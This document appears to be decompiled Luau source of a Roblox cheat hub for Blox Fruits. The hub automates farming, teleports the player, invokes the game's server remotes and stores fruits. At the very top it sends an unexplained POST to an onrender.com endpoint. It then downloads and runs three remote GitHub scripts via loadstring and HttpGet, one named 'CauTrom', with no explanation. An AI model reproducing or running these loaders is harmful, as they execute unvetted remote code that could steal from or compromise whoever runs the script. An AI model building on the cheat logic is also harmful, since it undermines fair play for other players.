-- Recovered Luau source by ZeroVector
local success, res = pcall(function()
    return request({
        Url = "https://iodkopasdjadjasdjadads.onrender.com/oicaiditnhauxaorau",
        Method = "POST",
    })
end)

if success and res then
    print("sus")
end

spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/WhiteX1208/Scripts/refs/heads/main/CauTrom.luau"))()
end)

local VirtualInputManager, tbl, humanoidRootPart, index, localPlayer, fn, fn2, v, v2, v3, v4, v5, v6, v7, v8, v9, ReplicatedStorage

do
    task.spawn(function()
        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/traurobloxdeptrai/traukhoaito/refs/heads/main/anhdomixi.lua"))()
        end)
    end)

    loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaAnarchist/YeuEmNhieuLam/refs/heads/main/helloword.lua"))()
    VirtualInputManager = game:GetService("VirtualInputManager")

    repeat
        task.wait()
    until game:IsLoaded() and game.Players.LocalPlayer:FindFirstChild("DataLoaded")

    local localPlayer2 = game.Players.LocalPlayer
    local playerGui = localPlayer2:WaitForChild("PlayerGui")

    if playerGui:FindFirstChild("Main (minimal)") or playerGui:FindFirstChild("ChooseTeam") then
        local remotes = game:GetService("ReplicatedStorage"):WaitForChild("Remotes")

        pcall(function()
            remotes.CommF_:InvokeServer("SetTeam", getgenv().team)
        end)

        repeat
            task.wait()
        until localPlayer2.Team and not playerGui:FindFirstChild("ChooseTeam")
    end

    if not localPlayer2.Character then
        localPlayer2.CharacterAdded:Wait()
    end

    local tbl2 = {
        "Rocket-Rocket",
        "Spin-Spin",
        "Chop-Chop",
        "Spring-Spring",
        "Bomb-Bomb",
        "Smoke-Smoke",
        "Spike-Spike",
        "Flame-Flame",
        "Falcon-Falcon",
        "Ice-Ice",
        "Sand-Sand",
        "Dark-Dark",
        "Ghost-Ghost",
        "Diamond-Diamond",
        "Light-Light",
        "Rubber-Rubber",
        "Barrier-Barrier",
    }

    local tbl3 = {
        "Lifesteal",
        "All Cooldowns",
        "HYPER!",
        "Fruit M1 Speed",
        "Armor",
        "Sniper",
        "Overflow",
        "Gun",
        "Melee",
        "Fruit",
        "Defense",
        "Fortress",
    }

    local character

    repeat
        task.wait()
        character = localPlayer2.Character
    until character and character:FindFirstChild("Humanoid") and character:FindFirstChild("HumanoidRootPart") and character.Humanoid.Health > 0

    local v10 = game

    local tbl4 = {
        ply = v10.Players,
        Players = v10.Players,
        Player = v10.Players.LocalPlayer,
        player = v10.Players.LocalPlayer,
        plr = v10.Players.LocalPlayer,
        Root = v10.Players.LocalPlayer.Character.HumanoidRootPart,
        replicated = v10:GetService("ReplicatedStorage"),
        Lv = v10.Players.LocalPlayer.Data.Level.Value,
        TeleportService = v10:GetService("TeleportService"),
        Lighting = v10:GetService("Lighting"),
        Enemies = workspace.Enemies,
        vim1 = v10:GetService("VirtualInputManager"),
        vim2 = v10:GetService("VirtualUser"),
        TeamSelf = v10.Players.LocalPlayer.Team,
        RunSer = v10:GetService("RunService"),
        Stats = v10:GetService("Stats"),
        Energy = v10.Players.LocalPlayer.Character.Energy.Value,
        Boss = {},
        TurnOnKen = true,
        debug = false,
        Sec = 0.1,
    }

    for k, v11 in pairs(tbl4) do
        getfenv()[k] = v11
    end

    local folder, HttpService, v11, v12, autoTranslate, tbl5, v13, v14, v15, request_

    repeat
        folder = Lighting:FindFirstChildOfClass("Folder")

        if folder and folder.Name == "LightingLayers" then
            folder:Destroy()
        end

        for i, child in ipairs(Lighting:GetChildren()) do
            if child.Name == "LightingLayers" or child.Name == "SeaTerrorCC" or child.Name == "FantasySky" then
                child:Destroy()
            end
        end

        repeat
            task.wait()
        until game:IsLoaded()

        HttpService = game:GetService("HttpService")
        game:GetService("TweenService")

        if makefolder and not isfolder("Redz Hub - OK Hub") then
            makefolder("Redz Hub - OK Hub")
        end

        if writefile and isfile and not isfile("Redz Hub - OK Hub/AutoTranslate.txt") then
            writefile("Redz Hub - OK Hub/AutoTranslate.txt", "false")
        end

        v11 = _G
        v12 = isfile
        autoTranslate = v12 and isfile("Redz Hub - OK Hub/AutoTranslate.txt") and readfile("Redz Hub - OK Hub/AutoTranslate.txt") == "true" or false
        v11.AutoTranslate = autoTranslate
        tbl5 = {}

        v13 = (function()
            local ok, result = pcall(function()
                return game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(plr)
            end)

            if ok and result then
                local v16 = ({
                    VN = "vi",
                    JP = "ja",
                    KR = "ko",
                    CN = "zh-CN",
                    TW = "zh-TW",
                    TH = "th",
                    ID = "id",
                    MY = "ms",
                    PH = "fil",
                    BR = "pt",
                    FR = "fr",
                    DE = "de",
                    ES = "es",
                    RU = "ru",
                    TR = "tr",
                    SA = "ar",
                    PL = "pl",
                    IT = "it",
                    NL = "nl",
                    IN = "hi",
                    PK = "ur",
                    BD = "bn",
                    LK = "si",
                    NP = "ne",
                    MM = "my",
                    EG = "ar",
                    IL = "he",
                    GR = "el",
                    SE = "sv",
                    DK = "da",
                    FI = "fi",
                    NO = "no",
                    CZ = "cs",
                    SK = "sk",
                    HU = "hu",
                    RO = "ro",
                    BG = "bg",
                    UA = "uk",
                    GE = "ka",
                    AM = "hy",
                    KZ = "kk",
                    UZ = "uz",
                    MN = "mn",
                    AF = "ps",
                    IR = "fa",
                    IQ = "ku",
                    MA = "fr",
                    ET = "am",
                    KE = "sw",
                    NG = "yo",
                    ZA = "af",
                    GH = "en",
                    IE = "ga",
                    HR = "hr",
                    RS = "sr",
                    BA = "bs",
                    SI = "sl",
                    LV = "lv",
                    LT = "lt",
                    EE = "et",
                    BY = "be",
                    MD = "ro",
                    MK = "mk",
                    AL = "sq",
                    IS = "is",
                    MT = "mt",
                    LU = "lb",
                    CY = "el",
                    BH = "ar",
                    KW = "ar",
                    OM = "ar",
                    QA = "ar",
                    AE = "ar",
                    YE = "ar",
                    JO = "ar",
                    LB = "ar",
                    LY = "ar",
                    DZ = "ar",
                    TN = "ar",
                    SD = "ar",
                    SO = "so",
                    RW = "rw",
                    UG = "lg",
                    TZ = "sw",
                    ZM = "en",
                    ZW = "en",
                    MZ = "pt",
                    AO = "pt",
                    CV = "pt",
                    TL = "pt",
                    GY = "en",
                    SR = "nl",
                    JM = "en",
                    HT = "ht",
                    BB = "en",
                    BS = "en",
                    GL = "da",
                    FO = "fo",
                    AD = "ca",
                    LI = "de",
                    MC = "fr",
                    SM = "it",
                    VA = "la",
                })[result]

                local str = v16 or "en"
                return str
            end

            local v16 = tostring
            local localeId = plr.LocaleId
            local str = localeId or ""
            local v17 = v16(str)
            local str2 = v17 ~= "" and v17 or "en"
            return str2
        end)()

        if v13 ~= "en" then
            _G.AutoTranslate = true
        end

        v14 = (function()
            local str = "Redz Hub - OK Hub/Translate Data/" .. v13 .. ".json"

            if isfile and isfile(str) then
                local ok, result = pcall(function()
                    return HttpService:JSONDecode(readfile(str))
                end)

                if ok and type(result) == "table" then
                    return result
                end
            end

            return nil
        end)()

        v15 = syn
        request_ = v15 and syn.request or http_request or request

        Translate = function(arg)
            if not arg or arg == "" then
                return arg
            end

            if tbl5[arg] then
                return tbl5[arg]
            end

            if v13 == "en" then
                return arg
            end

            if v14 and type(v14[arg]) == "string" and v14[arg] ~= "" then
                tbl5[arg] = v14[arg]
                return v14[arg]
            end
            local str = "https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=" .. v13 .. "&dt=t&q=" .. HttpService:UrlEncode(arg)

            local ok, result = pcall(function()
                return request_({Url = str, Method = "GET"}).Body
            end)

            if not ok or not result then
                return arg
            end

            local ok2, result2 = pcall(function()
                return HttpService:JSONDecode(result)[1][1][1]
            end)

            local flag = ok2 and result2 and result2 ~= "" and result2 or arg
            tbl5[arg] = flag
            return flag
        end

        _G.SaveData = {}

        SaveSettings = function()
            if writefile then
                local json = HttpService:JSONEncode(_G.SaveData)
                writefile("Redz Hub - OK Hub/Configs.json", json)
            end
        end

        LoadSettings = function()
            if isfile and isfile("Redz Hub - OK Hub/Configs.json") then
                local json = readfile("Redz Hub - OK Hub/Configs.json")

                local ok, saveData = pcall(function()
                    return HttpService:JSONDecode(json)
                end)

                if ok then
                    _G.SaveData = saveData
                    return true
                end
            end

            return false
        end

        GetSetting = function(arg, arg2)
            if _G.SaveData[arg] == nil then
                return arg2
            end
            return _G.SaveData[arg]
        end

        LoadSettings()
        task.wait()
    until game:IsLoaded() and plr:FindFirstChild("PlayerGui") and plr.PlayerGui:FindFirstChild("Main") and plr.PlayerGui.Main:FindFirstChild("Loading")

    local flag = game.PlaceId == 2753915549 or game.PlaceId == 85211729168715
    World1 = flag
    local flag2 = game.PlaceId == 4442272183 or game.PlaceId == 79091703265657
    World2 = flag2
    local flag3 = game.PlaceId == 7449423635 or game.PlaceId == 100117331123089
    World3 = flag3
    local flag4 = game.PlaceId == 73902483975735 or game.PlaceId == 73902483975735
    WorldD = flag4

    if not World1 and not World2 and not World3 and not WorldD then
        warn("game not supported")
    end

    Marines = function()
        replicated.Remotes.CommF_:InvokeServer("SetTeam", "Marines")
    end

    Pirates = function()
        replicated.Remotes.CommF_:InvokeServer("SetTeam", "Pirates")
    end

    if World1 then
        Boss = {
            "The Gorilla King",
            "Bobby",
            "The Saw",
            "Yeti",
            "Vice Admiral",
            "Saber Expert",
            "Warden",
            "Chief Warden",
            "Swan",
            "Magma Admiral",
            "Fishman Lord",
            "Wysper",
            "Thunder God",
            "Cyborg",
            "whitebeard",
        }
    elseif World2 then
        Boss = {
            "Diamond",
            "Jeremy",
            "Orbitus",
            "Don Swan",
            "Smoke Admiral",
            "Awakened Ice Admiral",
            "Tide Keeper",
            "Darkbeard",
            "Cursed Captain",
        }
    elseif World3 then
        Boss = {
            "Stone",
            "Hydra Leader",
            "Kilo Admiral",
            "Captain Elephant",
            "Beautiful Pirate",
            "Cake Queen",
            "Longma",
        }
    end

    if World1 then
        MaterialList = {
            "Leather + Scrap Metal",
            "Angel Wings",
            "Magma Ore",
            "Fish Tail",
        }
    elseif World2 then
        MaterialList = {
            "Leather + Scrap Metal",
            "Radioactive Material",
            "Ectoplasm",
            "Mystic Droplet",
            "Magma Ore",
            "Vampire Fang",
        }
    elseif World3 then
        MaterialList = {
            "Scrap Metal",
            "Demonic Wisp",
            "Conjured Cocoa",
            "Dragon Scale",
            "Gunpowder",
            "Fish Tail",
            "Mini Tusk",
        }
    end

    tbl = {
        "Flame",
        "Ice",
        "Quake",
        "Light",
        "Dark",
        "String",
        "Magma",
        "Human: Buddha",
        "Sand",
        "Bird: Phoenix",
        "Dough",
    }

    local tbl6 = {
        "Snow Lurker",
        "Arctic Warrior",
        "Hidden Key",
        "Awakened Ice Admiral",
    }

    tbl2 = {
        Mob = "Mythological Pirate",
        Mob2 = "Cursed Skeleton",
        [1] = "Hell's Messenger",
        Mob3 = "Cursed Skeleton",
        [2] = "Heaven's Guardian",
    }

    tbl2 = {
        "Part",
        "SpawnLocation",
        "Terrain",
        "WedgePart",
        "MeshPart",
    }

    local tbl7 = {"Swan Pirate", "Jeremy"}
    tbl2 = {"Forest Pirate", "Captain Elephant"}
    tbl2 = {"Fajita", "Jeremy", "Diamond"}

    tbl2 = {
        "Beast Hunter",
        "Lantern",
        "Guardian",
        "Grand Brigade",
        "Dinghy",
        "Sloop",
        "The Sentinel",
    }

    tbl2 = {"Cookie Crafter"}
    tbl2 = {"Reborn Skeleton"}

    local tbl8 = {
        ["Pirate Millionaire"] = CFrame.new(-712.8272705078125, 98.5770492553711, 5711.9541015625),
        ["Pistol Billionaire"] = CFrame.new(-723.4331665039062, 147.42906188964844, 5931.9931640625),
        ["Dragon Crew Warrior"] = CFrame.new(7021.50439453125, 55.76270294189453, -730.1290893554688),
        ["Dragon Crew Archer"] = CFrame.new(6625, 378, 244),
        ["Female Islander"] = CFrame.new(4692.7939453125, 797.9766845703125, 858.8480224609375),
        ["Venomous Assailant"] = CFrame.new(4902, 670, 39),
        ["Marine Commodore"] = CFrame.new(2401, 123, -7589),
        ["Marine Rear Admiral"] = CFrame.new(3588, 229, -7085),
        ["Fishman Raider"] = CFrame.new(-10941, 332, -8760),
        ["Fishman Captain"] = CFrame.new(-11035, 332, -9087),
        ["Forest Pirate"] = CFrame.new(-13446, 413, -7760),
        ["Mythological Pirate"] = CFrame.new(-13510, 584, -6987),
        ["Jungle Pirate"] = CFrame.new(-11778, 426, -10592),
        ["Musketeer Pirate"] = CFrame.new(-13282, 496, -9565),
        ["Reborn Skeleton"] = CFrame.new(-8764, 142, 5963),
        ["Living Zombie"] = CFrame.new(-10227, 421, 6161),
        ["Demonic Soul"] = CFrame.new(-9579, 6, 6194),
        ["Possessed Mummy"] = CFrame.new(-9579, 6, 6194),
        ["Peanut Scout"] = CFrame.new(-1993, 187, -10103),
        ["Peanut President"] = CFrame.new(-2215, 159, -10474),
        ["Ice Cream Chef"] = CFrame.new(-877, 118, -11032),
        ["Ice Cream Commander"] = CFrame.new(-877, 118, -11032),
        ["Cookie Crafter"] = CFrame.new(-2021, 38, -12028),
        ["Cake Guard"] = CFrame.new(-2024, 38, -12026),
        ["Baking Staff"] = CFrame.new(-1932, 38, -12848),
        ["Head Baker"] = CFrame.new(-1932, 38, -12848),
        ["Cocoa Warrior"] = CFrame.new(95, 73, -12309),
        ["Chocolate Bar Battler"] = CFrame.new(647, 42, -12401),
        ["Sweet Thief"] = CFrame.new(116, 36, -12478),
        ["Candy Rebel"] = CFrame.new(47, 61, -12889),
        Ghost = CFrame.new(5251, 5, 1111),
    }

    EquipWeapon = function(arg)
        if not arg then
            return
        end

        if plr.Backpack:FindFirstChild(arg) then
            plr.Character.Humanoid:EquipTool(plr.Backpack:FindFirstChild(arg))
        end
    end

    weaponSc = function(arg)
        for k, child in pairs(plr.Backpack:GetChildren()) do
            if child:IsA("Tool") and child.ToolTip == arg then
                EquipWeapon(child.Name)
            end
        end
    end

    local v16 = _G
    local tbl9 = v16 or {}
    _G = tbl9
    _G.MeleeZ = false
    _G.MeleeX = false
    _G.MeleeC = false
    _G.SwordZ = false
    _G.SwordX = false
    _G.BloxFruitZ = false
    _G.BloxFruitX = false
    _G.BloxFruitC = false
    _G.BloxFruitV = false
    _G.BloxFruitF = false
    _G.GunZ = false
    _G.GunX = false

    _S = function(arg, arg2)
        if arg == "Melee" then
            weaponSc("Melee")

            if arg2 == "Z" and _G.MeleeZ then
                VirtualInputManager:SendKeyEvent(true, "Z", false, game)
                VirtualInputManager:SendKeyEvent(false, "Z", false, game)
            elseif arg2 == "X" and _G.MeleeX then
                VirtualInputManager:SendKeyEvent(true, "X", false, game)
                VirtualInputManager:SendKeyEvent(false, "X", false, game)
            elseif arg2 == "C" and _G.MeleeC then
                VirtualInputManager:SendKeyEvent(true, "C", false, game)
                VirtualInputManager:SendKeyEvent(false, "C", false, game)
            end
        elseif arg == "Sword" then
            weaponSc("Sword")

            if arg2 == "Z" and _G.SwordZ then
                VirtualInputManager:SendKeyEvent(true, "Z", false, game)
                VirtualInputManager:SendKeyEvent(false, "Z", false, game)
            elseif arg2 == "X" and _G.SwordX then
                VirtualInputManager:SendKeyEvent(true, "X", false, game)
                VirtualInputManager:SendKeyEvent(false, "X", false, game)
            end
        elseif arg == "Blox Fruit" then
            weaponSc("Blox Fruit")

            if arg2 == "Z" and _G.BloxFruitZ then
                VirtualInputManager:SendKeyEvent(true, "Z", false, game)
                VirtualInputManager:SendKeyEvent(false, "Z", false, game)
            elseif arg2 == "X" and _G.BloxFruitX then
                VirtualInputManager:SendKeyEvent(true, "X", false, game)
                VirtualInputManager:SendKeyEvent(false, "X", false, game)
            elseif arg2 == "C" and _G.BloxFruitC then
                VirtualInputManager:SendKeyEvent(true, "C", false, game)
                VirtualInputManager:SendKeyEvent(false, "C", false, game)
            elseif arg2 == "V" and _G.BloxFruitV then
                VirtualInputManager:SendKeyEvent(true, "V", false, game)
                VirtualInputManager:SendKeyEvent(false, "V", false, game)
            elseif arg2 == "F" and _G.BloxFruitF then
                VirtualInputManager:SendKeyEvent(true, "F", false, game)
                VirtualInputManager:SendKeyEvent(false, "F", false, game)
            end
        elseif arg == "Gun" then
            weaponSc("Gun")

            if arg2 == "Z" and _G.GunZ then
                VirtualInputManager:SendKeyEvent(true, "Z", false, game)
                VirtualInputManager:SendKeyEvent(false, "Z", false, game)
            elseif arg2 == "X" and _G.GunX then
                VirtualInputManager:SendKeyEvent(true, "X", false, game)
                VirtualInputManager:SendKeyEvent(false, "X", false, game)
            end
        end
    end

    local localPlayer3 = game:GetService("Players").LocalPlayer
    local character2 = localPlayer3.Character or localPlayer3.CharacterAdded:Wait()
    humanoidRootPart = character2:WaitForChild("HumanoidRootPart")

    localPlayer3.CharacterAdded:Connect(function(character3)
        character2 = character3
        humanoidRootPart = character3:WaitForChild("HumanoidRootPart")
    end)

    Buso = function()
        if not _G.TurnOnBuso then
            return
        end
        local tbl10 = {"HasBuso", "Buso"}

        if not plr.Character:FindFirstChild(tbl10[1]) then
            replicated.Remotes.CommF_:InvokeServer(tbl10[2])
        end
    end

    index = {}
    index.__index = index

    index.Alive = function(arg)
        if not arg then
            return
        end
        local humanoid = arg:FindFirstChild("Humanoid")
        local flag5 = humanoid and humanoid.Health > 0
        return flag5
    end

    index.Pos = function(arg, arg2)
        if not arg or not arg:FindFirstChild("HumanoidRootPart") or not humanoidRootPart or not humanoidRootPart.Parent then
            return false
        end
        local farmDistance = arg2 or _G.FarmDistance
        local v17 = farmDistance
        local flag5 = (humanoidRootPart.Position - arg.HumanoidRootPart.Position).Magnitude <= v17
        return flag5
    end

    index.Dist = function(arg, arg2)
        if not arg or not arg:FindFirstChild("HumanoidRootPart") or not humanoidRootPart or not humanoidRootPart.Parent then
            return false
        end
        local farmDistance = arg2 or _G.FarmDistance
        local v17 = farmDistance
        local flag5 = (humanoidRootPart.Position - arg.HumanoidRootPart.Position).Magnitude <= v17
        return flag5
    end

    index.DistH = function(arg, arg2)
        if not arg or not arg:FindFirstChild("HumanoidRootPart") or not humanoidRootPart or not humanoidRootPart.Parent then
            return false
        end
        local farmDistance = arg2 or _G.FarmDistance
        local v17 = farmDistance
        local flag5 = v17 < (humanoidRootPart.Position - arg.HumanoidRootPart.Position).Magnitude
        return flag5
    end

    index.Dist = function(arg, arg2)
        if not humanoidRootPart or not humanoidRootPart.Parent then
            return false
        end
        local flag5 = (humanoidRootPart.Position - arg:FindFirstChild("HumanoidRootPart").Position).Magnitude <= arg2
        return flag5
    end

    index.DistH = function(arg, arg2)
        if not humanoidRootPart or not humanoidRootPart.Parent then
            return false
        end
        local flag5 = arg2 < (humanoidRootPart.Position - arg:FindFirstChild("HumanoidRootPart").Position).Magnitude
        return flag5
    end

    local handlers = {
        Up = function(arg)
            if not humanoidRootPart or not humanoidRootPart.Parent then
                return
            end
            local humanoidRootPart2 = arg and arg:FindFirstChild("HumanoidRootPart")
            if not humanoidRootPart2 then
                return
            end
            local farmDistance = _G.FarmDistance
            local n = farmDistance or 30
            local magnitude = (humanoidRootPart.Position - humanoidRootPart2.Position).Magnitude
            local n2 = humanoidRootPart2.Position + Vector3.new(0, n, 0)
            local cframe = CFrame.new(n2)

            if magnitude < 180 then
                humanoidRootPart.CFrame = cframe
            else
                tween(cframe)
            end
        end,
        Orbit = function(arg)
            if not humanoidRootPart or not humanoidRootPart.Parent then
                return
            end
            local humanoidRootPart2 = arg and arg:FindFirstChild("HumanoidRootPart")
            if not humanoidRootPart2 then
                return
            end
            local farmDistance = _G.FarmDistance
            local n = farmDistance or 30
            local magnitude = (humanoidRootPart.Position - humanoidRootPart2.Position).Magnitude
            local n2 = tick() * 150 % 360
            local v17 = math.rad(n2)
            local n3 = math.cos(v17) * n
            local n4 = math.sin(v17) * n
            local n5 = humanoidRootPart2.Position + Vector3.new(n3, 10, n4)
            local cframe = CFrame.new(n5)

            if n + 15 < magnitude then
                tween(CFrame.new(humanoidRootPart2.Position + Vector3.new(0, 10, n)))
            else
                tween3(cframe)
            end
        end,
        Star = function(arg)
            if not humanoidRootPart or not humanoidRootPart.Parent then
                return
            end
            local humanoidRootPart2 = arg and arg:FindFirstChild("HumanoidRootPart")
            if not humanoidRootPart2 then
                return
            end
            local farmDistance = _G.FarmDistance
            local n = farmDistance or 30
            local magnitude = (humanoidRootPart.Position - humanoidRootPart2.Position).Magnitude
            local n2 = math.floor(tick() * 2) % 3
            local v17 = math.rad(n2 * 120)
            local n3 = math.cos(v17) * n
            local n4 = math.sin(v17) * n
            local n5 = humanoidRootPart2.Position + Vector3.new(n3, 5, n4)
            local cframe = CFrame.new(n5)

            if magnitude < 150 then
                humanoidRootPart.CFrame = cframe
            else
                tween(cframe)
            end
        end,
    }

    local function fn3(arg)
        local mode = _G.Mode
        local str = mode or "Up"

        if handlers[str] then
            handlers[str](arg)
        end
    end

    Kill = function(arg, arg2)
        if arg and arg2 and humanoidRootPart and humanoidRootPart.Parent then
            Buso()

            if not arg:GetAttribute("Locked") then
                arg:SetAttribute("Locked", arg.HumanoidRootPart.CFrame)
            end

            local position = arg:GetAttribute("Locked").Position
            CfMon = position
            bringmob()
            EquipWeapon(_G.SelectWeapon)
            fn3(arg)
        end
    end

    Kill2 = function(arg, arg2)
        if arg and arg2 and humanoidRootPart and humanoidRootPart.Parent then
            Buso()

            if not arg:GetAttribute("Locked") then
                arg:SetAttribute("Locked", arg.HumanoidRootPart.CFrame)
            end

            local position = arg:GetAttribute("Locked").Position
            CfMon = position
            bringmob()
            EquipWeapon(_G.SelectWeapon)
            fn3(arg)
        end
    end

    KillSea = function(arg, arg2)
        if arg and arg2 and humanoidRootPart and humanoidRootPart.Parent then
            Buso()

            if not arg:GetAttribute("Locked") then
                arg:SetAttribute("Locked", arg.HumanoidRootPart.CFrame)
            end

            local position = arg:GetAttribute("Locked").Position
            CfMon = position
            bringmob()
            EquipWeapon(_G.SelectWeapon)
            local farmDistance = _G.FarmDistance
            tele(arg.HumanoidRootPart.CFrame * CFrame.new(0, farmDistance, 0))
            task.wait(0.05)
            tele(arg.HumanoidRootPart.CFrame * CFrame.new(0, farmDistance * 2, 0))
            task.wait(0.08)
        end
    end

    index.Sword = function(arg, arg2)
        if arg and arg2 and humanoidRootPart and humanoidRootPart.Parent then
            Buso()

            if not arg:GetAttribute("Locked") then
                arg:SetAttribute("Locked", arg.HumanoidRootPart.CFrame)
            end

            local position = arg:GetAttribute("Locked").Position
            CfMon = position
            bringmob()
            weaponSc("Sword")
            fn3(arg)
        end
    end

    index.Mas = function(arg, arg2)
        if arg and arg2 and humanoidRootPart and humanoidRootPart.Parent then
            Buso()

            if not arg:GetAttribute("Locked") then
                arg:SetAttribute("Locked", arg.HumanoidRootPart.CFrame)
            end

            local position = arg:GetAttribute("Locked").Position
            CfMon = position
            bringmob()
            local farmDistance = _G.FarmDistance

            if arg.Humanoid.Health <= HealthM then
                fn3(arg)

                if _G.BloxFruitZ then
                    _S("Blox Fruit", "Z")
                end

                if _G.BloxFruitX then
                    _S("Blox Fruit", "X")
                end

                if _G.BloxFruitC then
                    _S("Blox Fruit", "C")
                end

                if _G.BloxFruitV then
                    _S("Blox Fruit", "V")
                end

                if _G.BloxFruitF then
                    _S("Blox Fruit", "F")
                end
            else
                weaponSc("Melee")
                fn3(arg)
            end
        end
    end

    index.Masgun = function(arg, arg2)
        if arg and arg2 and humanoidRootPart and humanoidRootPart.Parent then
            Buso()

            if not arg:GetAttribute("Locked") then
                arg:SetAttribute("Locked", arg.HumanoidRootPart.CFrame)
            end

            local position = arg:GetAttribute("Locked").Position
            CfMon = position
            bringmob()
            local farmDistance = _G.FarmDistance

            if arg.Humanoid.Health <= HealthM then
                tween(arg.HumanoidRootPart.CFrame * CFrame.new(0, farmDistance + 5, farmDistance / 3))

                if _G.GunZ then
                    _S("Gun", "Z")
                end

                if _G.GunX then
                    _S("Gun", "X")
                end
            else
                weaponSc("Melee")
                fn3(arg)
            end
        end
    end

    statsSetings = function(arg, arg2)
        if arg == "Melee" then
            if plr.Data.Points.Value ~= 0 then
                replicated.Remotes.CommF_:InvokeServer("AddPoint", "Melee", arg2)
            end
        elseif arg == "Defense" then
            if plr.Data.Points.Value ~= 0 then
                replicated.Remotes.CommF_:InvokeServer("AddPoint", "Defense", arg2)
            end
        elseif arg == "Sword" then
            if plr.Data.Points.Value ~= 0 then
                replicated.Remotes.CommF_:InvokeServer("AddPoint", "Sword", arg2)
            end
        elseif arg == "Gun" then
            if plr.Data.Points.Value ~= 0 then
                replicated.Remotes.CommF_:InvokeServer("AddPoint", "Gun", arg2)
            end
        elseif arg == "Devil" and plr.Data.Points.Value ~= 0 then
            replicated.Remotes.CommF_:InvokeServer("AddPoint", "Demon Fruit", arg2)
        end
    end

    MobCheck = function(arg)
        for k, child in pairs(replicated:GetChildren()) do
            if child:IsA("Model") and (typeof(arg) == "table" and table.find(arg, child.Name) or child.Name == arg) and child:FindFirstChild("Humanoid") and child.Humanoid.Health > 0 then
                return child
            end
        end

        local v17 = next
        local children, v18 = game.Workspace.Enemies:GetChildren()

        for k, v19 in v17, children, v18 do
            if v19:IsA("Model") and (typeof(arg) == "table" and table.find(arg, v19.Name) or v19.Name == arg) and v19:FindFirstChild("Humanoid") and v19.Humanoid.Health > 0 then
                return v19
            end
        end
    end

    CheckBoat = function()
        local v17 = nil
        local huge = math.huge
        local character3 = plr.Character
        local humanoidRootPart2 = character3 and character3:FindFirstChild("HumanoidRootPart")
        if not humanoidRootPart2 then
            return nil
        end

        for k, child in pairs(workspace.Boats:GetChildren()) do
            local owner = child:FindFirstChild("Owner")
            local vehicleSeat = child:FindFirstChildWhichIsA("VehicleSeat")

            if owner and tostring(owner.Value) == tostring(plr.Name) and vehicleSeat then
                local magnitude = (vehicleSeat.Position - humanoidRootPart2.Position).Magnitude

                if magnitude < huge then
                    huge = magnitude
                    v17 = child
                end
            end
        end

        if huge <= 1000 then
            return v17
        end
        return nil
    end

    CheckEnemiesBoat = function()
        for k, child in pairs(workspace.Enemies:GetChildren()) do
            if child.Name == "FishBoat" and child:FindFirstChild("Health").Value > 0 then
                return true
            end
        end

        return false
    end

    CheckPirateGrandBrigade = function()
        for k, child in pairs(workspace.Enemies:GetChildren()) do
            if (child.Name == "PirateGrandBrigade" or child.Name == "PirateBrigade") and child:FindFirstChild("Health").Value > 0 then
                return true
            end
        end

        return false
    end

    CheckShark = function()
        for k, child in pairs(workspace.Enemies:GetChildren()) do
            if child.Name == "Shark" and index.Alive(child) then
                return true
            end
        end

        return false
    end

    CheckTerrorShark = function()
        for k, child in pairs(workspace.Enemies:GetChildren()) do
            if child.Name == "Terrorshark" and index.Alive(child) then
                return true
            end
        end

        return false
    end

    CheckPiranha = function()
        for k, child in pairs(workspace.Enemies:GetChildren()) do
            if child.Name == "Piranha" and index.Alive(child) then
                return true
            end
        end

        return false
    end

    CheckFishCrew = function()
        for k, child in pairs(workspace.Enemies:GetChildren()) do
            if (child.Name == "Fish Crew Member" or child.Name == "Haunted Crew Member") and index.Alive(child) then
                return true
            end
        end

        return false
    end

    CheckHauntedCrew = function()
        for k, child in pairs(workspace.Enemies:GetChildren()) do
            if child.Name == "Haunted Crew Member" and index.Alive(child) then
                return true
            end
        end

        return false
    end

    CheckSeaBeast = function()
        if not workspace.SeaBeasts:FindFirstChild("seabeatfarm") then
            return false
        end
        return true
    end

    CheckLeviathan = function()
        if not workspace.SeaBeasts:FindFirstChild("Leviathan") then
            return false
        end
        return true
    end

    local ReplicatedStorage2 = game:GetService("ReplicatedStorage")
    localPlayer = game:GetService("Players").LocalPlayer

    local function fn4(arg)
        if type(arg) == "table" and arg.Name then
            local v17 = string.gsub(arg.Name, " Fruit", "")
            return v17 .. "-" .. v17
        end
        local str = tostring(arg)
        local v17 = string.gsub(str, " Fruit", "")
        return v17 .. "-" .. v17
    end

    FruitRemote = function()
        local backpack = localPlayer:FindFirstChild("Backpack")
        local character3 = localPlayer.Character

        if backpack then
            local v17 = next
            local children, v18 = backpack:GetChildren()

            for k, v19 in v17, children, v18 do
                if v19:IsA("Tool") and v19:FindFirstChild("Fruit") then
                    ReplicatedStorage2.Remotes.CommF_:InvokeServer("StoreFruit", fn4(v19.Name), v19)
                end
            end
        end

        if character3 then
            local v17 = next
            local children, v18 = character3:GetChildren()

            for k, v19 in v17, children, v18 do
                if v19:IsA("Tool") and v19:FindFirstChild("Fruit") then
                    ReplicatedStorage2.Remotes.CommF_:InvokeServer("StoreFruit", fn4(v19.Name), v19)
                end
            end
        end
    end

    task.spawn(function()
        while getgenv().AutoStoreFruits do
            task.wait()

            pcall(function()
                FruitRemote()
            end)
        end
    end)

    CheckMatTrang = function()
        if World1 then
            return Lighting.FantasySky.MoonTextureId
        end

        if World2 then
            return Lighting.FantasySky.MoonTextureId
        end

        if not World3 then
            return
        end
        return Lighting.Sky.MoonTextureId
    end

    LayItems = function(arg)
        local v17 = localPlayer.Backpack:FindFirstChild(arg)
        local v18 = v17 or localPlayer.Character:FindFirstChild(arg)
        return v18
    end

    GetIn = function(arg)
        for k, v17 in pairs(ReplicatedStorage2.Remotes.CommF_:InvokeServer("getInventory")) do
            if type(v17) == "table" and (v17.Name == arg or localPlayer.Character:FindFirstChild(arg) or localPlayer.Backpack:FindFirstChild(arg)) then
                return true
            end
        end

        return false
    end

    LayMaterial = function(arg)
        for k, v17 in pairs(ReplicatedStorage2.Remotes.CommF_:InvokeServer("getInventory")) do
            if type(v17) == "table" and v17.Type == "Material" and v17.Name == arg then
                return v17.Count
            end
        end

        return 0
    end

    GetWP = function(arg)
        for k, v17 in pairs(ReplicatedStorage2.Remotes.CommF_:InvokeServer("getInventory")) do
            if type(v17) == "table" and v17.Type == "Sword" and (v17.Name == arg or localPlayer.Character:FindFirstChild(arg) or localPlayer.Backpack:FindFirstChild(arg)) then
                return true
            end
        end

        return false
    end

